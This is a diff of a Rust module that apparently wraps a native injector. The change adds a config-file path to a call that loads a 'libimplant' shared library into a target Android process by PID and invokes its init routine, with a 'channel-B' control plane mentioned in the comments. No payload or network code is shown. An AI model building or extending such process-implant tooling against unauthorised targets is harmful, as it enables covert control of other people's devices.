@@ -20,7 +20,12 @@ pub const INJECT_INIT_FAILED: c_int = -4;
 pub const INJECT_BITNESS_FAILED: c_int = -5;
 
 extern "C" {
-    fn vbi_inject(pid: c_int, so_path: *const c_char, init_sym: *const c_char) -> c_int;
+    fn vbi_inject(
+        pid: c_int,
+        so_path: *const c_char,
+        init_sym: *const c_char,
+        config_path: *const c_char,
+    ) -> c_int;
 }
 
 /// The result of an injection attempt.
@@ -67,9 +72,9 @@ impl InjectResult {
 ///
 /// `abi` selects the per-ABI payload ("arm64-v8a" or "armeabi-v7a").
 /// The daemon passes the matching-ABI path based on runtime bitness detection.
-/// `config_path` is written to the channel-B config file (see control_plane)
-/// and the injector passes it to implant_init.
-pub fn inject(pid: i32, abi: &str) -> InjectResult {
+/// `config_path` is the channel-B config file path (see control_plane);
+/// the injector writes it into the target and passes it to implant_init.
+pub fn inject(pid: i32, abi: &str, config_path: &str) -> InjectResult {
     let so_path = config::libimplant_path(abi);
 
     // Verify the payload file exists before attempting injection.
@@ -89,10 +94,14 @@ pub fn inject(pid: i32, abi: &str) -> InjectResult {
         Ok(c) => c,
         Err(_) => return InjectResult::InitFailed,
     };
+    let c_cfg = match CString::new(config_path) {
+        Ok(c) => c,
+        Err(_) => return InjectResult::InitFailed,
+    };
 
     log::info("injector", &format!("injecting pid={pid} abi={abi}"));
 
-    let code = unsafe { vbi_inject(pid, c_so.as_ptr(), c_sym.as_ptr()) };
+    let code = unsafe { vbi_inject(pid, c_so.as_ptr(), c_sym.as_ptr(), c_cfg.as_ptr()) };
     let result = InjectResult::from_code(code);
 
     if result.is_ok() {
